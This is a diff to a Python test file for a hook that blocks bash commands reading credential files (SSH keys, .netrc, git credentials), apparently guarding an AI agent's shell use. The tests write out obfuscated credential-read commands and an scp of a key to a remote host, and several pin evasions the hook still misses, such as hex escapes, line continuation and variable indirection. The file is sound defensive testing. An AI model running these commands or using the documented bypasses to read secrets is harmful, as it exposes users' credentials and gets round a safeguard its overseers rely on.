@@ -154,6 +154,71 @@ class TestDenyCredentialBashReads:
         search-pattern argument."""
         assert run_hook(DENY_CREDENTIAL_BASH_READS_HOOK, bash_input('grep "id_rsa" .'), home=isolated_home) == "deny"
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            'cat ~/.ssh/config"_backup"',
+            'cat ~/.net"rc"',
+            'cat ~/.git-credential"s"',
+            'cat /foo/credentials.j"son"',
+        ],
+    )
+    def test_quote_split_credential_path_denied(self, isolated_home, command):
+        """Required regression test for a Critical finding: bash reassembles
+        an adjacent-quote split like `cat ~/.ssh/config"_backup"` into the
+        single word `cat ~/.ssh/config_backup` before executing it, but a
+        raw-text `grep -E` scan of the unexpanded command previously saw the
+        quote character as a hard break and missed the reassembled
+        credential-path token — a single-command, variable-free bypass of
+        every alternation in _LIB_CREDENTIAL_PATH_REGEX and of
+        _lib_has_unsafe_ssh_dir_reference's basename extraction alike.
+        Closed by quote-stripping $COMMAND (_lib_strip_shell_quotes) before
+        matching. Pinned so a future edit that matches against raw $COMMAND
+        again doesn't silently reopen it."""
+        assert run_hook(DENY_CREDENTIAL_BASH_READS_HOOK, bash_input(command), home=isolated_home) == "deny"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            r"cat ~/id_r\sa",
+            r"cat ~/.net\rc",
+            "cat ~/id_r$''sa",
+            'cat ~/id_r$""sa',
+        ],
+    )
+    def test_backslash_and_dollar_quote_split_credential_path_denied(self, isolated_home, command):
+        """Required regression test for a Critical finding found during
+        adversarial re-verification of the quote-splitting fix above: bash
+        has two more character-removal-based literal-reassembly mechanisms
+        besides adjacent-quote splitting, both of which reassemble
+        `id_r\\sa`/`id_r$''sa`/`id_r$""sa` into `id_rsa` when executed
+        (confirmed via `bash -c`) — an unquoted backslash-escaped character,
+        and an ANSI-C ($'...') or locale-translated ($"...") quoted empty
+        segment. The initial quote-stripping fix (bare `"`/`'` removal
+        only) missed both; _lib_strip_shell_quotes now also collapses the
+        `$'`/`$"` opener and removes backslash-escapes. Pinned so a future
+        edit that narrows the strip back to bare quotes doesn't silently
+        reopen either bypass."""
+        assert run_hook(DENY_CREDENTIAL_BASH_READS_HOOK, bash_input(command), home=isolated_home) == "deny"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "cat ~/.SSH/Deploy_Key",
+            "cat ~/.ssh/DEPLOY_KEY",
+            "scp ~/.Ssh/GitHub_Actions_Key user@host:",
+        ],
+    )
+    def test_case_varied_custom_named_ssh_key_denied(self, isolated_home, command):
+        """Required regression test: _lib_has_unsafe_ssh_dir_reference's own
+        basename extraction and safe-basename check both use case-insensitive
+        grep (-i), mirroring the case-fold coverage already pinned for
+        _LIB_CREDENTIAL_PATH_REGEX elsewhere in this file. Pinned so a future
+        edit that drops either -i flag from that function specifically
+        doesn't silently reopen a case-insensitive-filesystem bypass for the
+        custom-named-key class it exists to close."""
+        assert run_hook(DENY_CREDENTIAL_BASH_READS_HOOK, bash_input(command), home=isolated_home) == "deny"
+
     # ------------------------------------------------------------------ #
     # Documented residual — symlink/rename bypass                         #
     # ------------------------------------------------------------------ #
@@ -167,6 +232,100 @@ class TestDenyCredentialBashReads:
         raw-text-only hook cannot catch it. Pins the accepted gap as a
         known, tracked limitation rather than an unnoticed one."""
         assert run_hook(DENY_CREDENTIAL_BASH_READS_HOOK, bash_input("cat notes.txt"), home=isolated_home) == "allow"
+
+    def test_ansi_c_multichar_escape_bypass_allowed(self, isolated_home):
+        """Required regression test pinning a documented residual found
+        during adversarial re-verification of the quote/backslash-escape
+        fix above: bash's ANSI-C multi-character escapes (`\\xHH` hex,
+        octal, `\\uHHHH` unicode) reassemble into the escaped character
+        when executed (`$'\\x69\\x64\\x5f\\x72\\x73\\x61'` -> `id_rsa`,
+        confirmed via `bash -c`), but _lib_strip_shell_quotes's backslash
+        removal only ever consumes one character after each `\\` --
+        correct for single-char escapes, wrong for multi-digit ones.
+        Closing this exhaustively would require either executing the
+        untrusted command through real bash (unsafe: the same string can
+        carry command substitution) or an open-ended enumeration of bash's
+        escape grammar; accepted as a deliberate-obfuscation residual, the
+        same category as the variable-indirection case below, not the
+        "could happen by accident" case the existing normalization closes.
+        See docs/security-hardening.md's Limitations section."""
+        assert (
+            run_hook(
+                DENY_CREDENTIAL_BASH_READS_HOOK,
+                bash_input("cat ~/$'\\x69\\x64\\x5f\\x72\\x73\\x61'"),
+                home=isolated_home,
+            )
+            == "allow"
+        )
+
+    def test_backslash_newline_line_continuation_bypass_allowed(self, isolated_home):
+        """Required regression test pinning a documented residual found
+        during adversarial re-verification of the quote/backslash-escape
+        fix above: a literal backslash-newline inside the command text is
+        bash's line-continuation syntax and reassembles the split token
+        when executed (`id_r\\<LF>sa` -> `id_rsa`, confirmed via `bash -c`),
+        but sed (and grep -E, without a multiline flag) operate per-line,
+        so the token stays split across two lines in the scanned text no
+        matter how the backslash itself is handled. Accepted as a
+        deliberate-obfuscation residual -- see
+        docs/security-hardening.md's Limitations section."""
+        assert (
+            run_hook(
+                DENY_CREDENTIAL_BASH_READS_HOOK,
+                bash_input("cat ~/id_r\\\nsa"),
+                home=isolated_home,
+            )
+            == "allow"
+        )
+
+    def test_single_quoted_literal_backslash_false_positive_denied(self, isolated_home):
+        """Required regression test pinning a documented accepted
+        false-positive found during adversarial re-verification of the
+        backslash-escape-removal fix above: _lib_strip_shell_quotes strips
+        a backslash before any character universally, including inside
+        what bash treats as a single-quoted region, where bash itself
+        preserves the backslash literally (`'id_r\\sa'` stays
+        `id_r\\sa`, never `id_rsa`, confirmed via `bash -c`). A legitimate
+        command searching a log for the literal pattern `id_r\\sa` is
+        denied as a false positive -- an over-broad deny, never a missed
+        detection, consistent with this hook family's existing
+        false-positive tolerance (e.g. the `grep "id_rsa" .` residual
+        above). See docs/security-hardening.md's Limitations section."""
+        assert (
+            run_hook(
+                DENY_CREDENTIAL_BASH_READS_HOOK,
+                bash_input("grep -rn 'id_r\\sa' /var/log/app.log"),
+                home=isolated_home,
+            )
+            == "deny"
+        )
+
+    def test_variable_indirection_bypass_allowed(self, isolated_home):
+        """Required regression test pinning the documented variable-
+        indirection residual (docs/security-hardening.md's Limitations
+        section): a multi-statement command that assembles a credential
+        path through variable expansion carries no credential-path token
+        anywhere in its own literal command text, so this raw-text-only
+        hook cannot catch it. Distinct from the quote-splitting bypass
+        above — that was a single-command, variable-free gap this PR
+        closes; this one requires variable indirection and remains an
+        accepted, documented gap. Each fragment (".s"/"sh", "id_r"/"sa") is
+        individually too short to match any alternation in
+        _LIB_CREDENTIAL_PATH_REGEX, and no single line concatenates a full
+        ".ssh" or "id_rsa" substring — unlike an earlier version of this
+        test and of the docs/security-hardening.md example it mirrored,
+        which spelled "id_rsa" out contiguously in one assignment and so
+        was already caught by the existing basename-token match, not by
+        variable indirection at all. Pinned so the test suite demonstrates
+        every residual named in the docs, not only some of them."""
+        assert (
+            run_hook(
+                DENY_CREDENTIAL_BASH_READS_HOOK,
+                bash_input('a=".s"; b="sh"; c="id_r"; d="sa"; cat ~/"$a$b"/"$c$d"'),
+                home=isolated_home,
+            )
+            == "allow"
+        )
 
     # ------------------------------------------------------------------ #
     # Allow — no credential-shaped token present                          #
